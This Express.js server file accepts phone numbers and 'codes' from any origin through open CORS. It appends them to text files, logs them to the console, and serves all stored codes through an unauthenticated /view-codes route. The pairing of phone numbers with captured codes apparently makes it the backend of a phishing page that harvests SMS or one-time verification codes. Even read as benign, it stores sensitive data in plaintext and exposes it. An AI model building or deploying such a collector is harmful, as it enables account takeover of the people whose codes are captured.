const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const filePath = path.join(__dirname, 'codes.txt');


const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.json());

// Optional root route
app.get('/', (req, res) => {
  res.send('Backend is running!');
});

app.post('/save-phone', (req, res) => {
    const phone = req.body.phone;
    if (phone) {
      fs.appendFile('phones.txt', `${new Date().toISOString()} - ${phone}\n`, (err) => {
        if (err) return res.status(500).json({ error: 'Failed to save phone' });
        res.json({ status: 'success' });
      });
    } else {
      res.status(400).json({ error: 'No phone number provided' });
    }
  });
 
  app.get('/view-codes', (req, res) => {
    const fs = require('fs');
    const path = require('path');
    const filePath = path.join(__dirname, 'codes.txt');
  
    fs.readFile(filePath, 'utf8', (err, data) => {
      if (err) return res.status(500).send('Could not read file');
      res.type('text').send(data);
    });
  });
  

app.post('/store-code', (req, res) => {
  const code = req.body.code;
  const timestamp = new Date().toISOString();
  if (!code) {
    return res.status(400).json({ error: 'No code received' });
  }

  const entry = `${timestamp} - Code: ${code}\n`;
  const filePath = path.join(__dirname, 'codes.txt');

  fs.appendFile(filePath, entry, (err) => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).send('Failed to save code');
    }
    console.log('Code saved:', entry);
    res.send('Code saved');
  });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
